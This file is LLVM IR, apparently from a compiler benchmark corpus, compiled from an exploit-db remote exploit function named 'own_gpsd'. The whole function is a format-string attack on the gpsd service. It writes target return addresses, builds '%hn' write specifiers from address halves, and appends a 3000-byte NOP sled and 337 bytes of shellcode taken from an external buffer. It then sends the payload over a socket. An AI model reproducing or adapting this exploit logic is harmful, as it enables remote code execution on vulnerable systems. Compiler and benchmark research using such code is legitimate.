; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_775.c_own_gpsd.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_775.c_own_gpsd.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32 }

@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str = private unnamed_addr constant [22 x i8] c"retloc has a null; <\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"%.8x\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"%.\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"%u\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"lx%hn\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [23 x i8] c"# send exploit data. \0A\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c"[*] data sent %d bytes .\0A\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"l\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @own_gpsd(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca [90000 x i8], align 16
  %15 = alloca [256 x i8], align 16
  %16 = alloca i8*, align 8
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  store i32 17, i32* %5, align 4
  store i32 7, i32* %6, align 4
  store i32 3, i32* %7, align 4
  %17 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %18 = load i32, i32* %4, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %17, i64 %19
  %21 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %20, i32 0, i32 0
  %22 = load i32, i32* %21, align 4
  %23 = call i64 @checkZero(i32 %22)
  %24 = icmp ne i64 %23, 0
  br i1 %24, label %35, label %25

25:                                               ; preds = %2
  %26 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %27 = load i32, i32* %4, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i64 %28
  %30 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i32 0, i32 0
  %31 = load i32, i32* %30, align 4
  %32 = add nsw i32 %31, 2
  %33 = call i64 @checkZero(i32 %32)
  %34 = icmp ne i64 %33, 0
  br i1 %34, label %35, label %38

35:                                               ; preds = %25, %2
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))
  %37 = call i32 @exit(i32 1) #3
  unreachable

38:                                               ; preds = %25
  %39 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %40 = load i32, i32* %4, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %39, i64 %41
  %43 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %42, i32 0, i32 1
  %44 = load i32, i32* %43, align 4
  %45 = ashr i32 %44, 0
  %46 = and i32 %45, 65535
  store i32 %46, i32* %8, align 4
  %47 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i64 %49
  %51 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i32 0, i32 1
  %52 = load i32, i32* %51, align 4
  %53 = ashr i32 %52, 16
  %54 = and i32 %53, 65535
  store i32 %54, i32* %9, align 4
  %55 = load i32, i32* %8, align 4
  %56 = load i32, i32* %5, align 4
  %57 = sub nsw i32 %55, %56
  %58 = load i32, i32* %6, align 4
  %59 = mul nsw i32 %58, 8
  %60 = add nsw i32 %59, 16
  %61 = load i32, i32* %7, align 4
  %62 = add nsw i32 %60, %61
  %63 = sub nsw i32 %57, %62
  %64 = sext i32 %63 to i64
  store i64 %64, i64* %12, align 8
  %65 = load i32, i32* %9, align 4
  %66 = add nsw i32 65536, %65
  %67 = load i32, i32* %8, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  store i64 %69, i64* %13, align 8
  %70 = getelementptr inbounds [90000 x i8], [90000 x i8]* %14, i64 0, i64 0
  %71 = call i32 @memset(i8* %70, i32 65, i32 3)
  %72 = getelementptr inbounds [90000 x i8], [90000 x i8]* %14, i64 0, i64 0
  %73 = getelementptr inbounds i8, i8* %72, i64 3
  store i8* %73, i8** %16, align 8
  %74 = load i8*, i8** %16, align 8
  %75 = call i8* @putLong(i8* %74, i32 1111638594)
  store i8* %75, i8** %16, align 8
  %76 = load i8*, i8** %16, align 8
  %77 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %78 = load i32, i32* %4, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %77, i64 %79
  %81 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 4
  %83 = call i8* @putLong(i8* %76, i32 %82)
  store i8* %83, i8** %16, align 8
  %84 = load i8*, i8** %16, align 8
  %85 = call i8* @putLong(i8* %84, i32 1111638594)
  store i8* %85, i8** %16, align 8
  %86 = load i8*, i8** %16, align 8
  %87 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %88 = load i32, i32* %4, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %87, i64 %89
  %91 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = add nsw i32 %92, 2
  %94 = call i8* @putLong(i8* %86, i32 %93)
  store i8* %94, i8** %16, align 8
  store i32 0, i32* %10, align 4
  br label %95

95:                                               ; preds = %102, %38
  %96 = load i32, i32* %10, align 4
  %97 = load i32, i32* %6, align 4
  %98 = icmp slt i32 %96, %97
  br i1 %98, label %99, label %105

99:                                               ; preds = %95
  %100 = load i8*, i8** %16, align 8
  %101 = call i32 @strcat(i8* %100, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  br label %102

102:                                              ; preds = %99
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  br label %95

105:                                              ; preds = %95
  %106 = load i8*, i8** %16, align 8
  %107 = call i32 @strcat(i8* %106, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %108 = load i8*, i8** %16, align 8
  %109 = load i8*, i8** %16, align 8
  %110 = call i32 @strlen(i8* %109)
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %108, i64 %111
  %113 = load i64, i64* %12, align 8
  %114 = call i32 @sprintf(i8* %112, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i64 %113)
  %115 = load i8*, i8** %16, align 8
  %116 = call i32 @strcat(i8* %115, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %117 = load i8*, i8** %16, align 8
  %118 = call i32 @strcat(i8* %117, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %119 = load i8*, i8** %16, align 8
  %120 = load i8*, i8** %16, align 8
  %121 = call i32 @strlen(i8* %120)
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %119, i64 %122
  %124 = load i64, i64* %13, align 8
  %125 = call i32 @sprintf(i8* %123, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i64 %124)
  %126 = load i8*, i8** %16, align 8
  %127 = call i32 @strcat(i8* %126, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %128 = load i8*, i8** %16, align 8
  %129 = call i32 @strlen(i8* %128)
  store i32 %129, i32* %10, align 4
  %130 = load i8*, i8** %16, align 8
  %131 = load i32, i32* %10, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8, i8* %130, i64 %132
  %134 = call i32 @memset(i8* %133, i32 144, i32 3000)
  %135 = load i32, i32* %10, align 4
  %136 = add nsw i32 %135, 3000
  store i32 %136, i32* %10, align 4
  %137 = load i8*, i8** %16, align 8
  %138 = load i32, i32* %10, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8, i8* %137, i64 %139
  %141 = load i8*, i8** @shellcode, align 8
  %142 = call i32 @memcpy(i8* %140, i8* %141, i32 337)
  %143 = load i32, i32* %10, align 4
  %144 = add nsw i32 %143, 337
  store i32 %144, i32* %10, align 4
  %145 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  %146 = call i32 @sleep(i32 1)
  %147 = load i32, i32* %3, align 4
  %148 = getelementptr inbounds [90000 x i8], [90000 x i8]* %14, i64 0, i64 0
  %149 = load i32, i32* %10, align 4
  %150 = call i32 @send(i32 %147, i8* %148, i32 %149, i32 0)
  store i32 %150, i32* %11, align 4
  %151 = load i32, i32* %10, align 4
  %152 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0), i32 %151)
  %153 = getelementptr inbounds [256 x i8], [256 x i8]* %15, i64 0, i64 0
  %154 = call i32 @memcpy(i8* %153, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32 2)
  %155 = load i32, i32* %3, align 4
  %156 = getelementptr inbounds [256 x i8], [256 x i8]* %15, i64 0, i64 0
  %157 = call i32 @send(i32 %155, i8* %156, i32 2, i32 0)
  store i32 %157, i32* %11, align 4
  %158 = load i32, i32* %11, align 4
  %159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0), i32 %158)
  ret i32 0
}

declare dso_local i64 @checkZero(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @putLong(i8*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i64) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
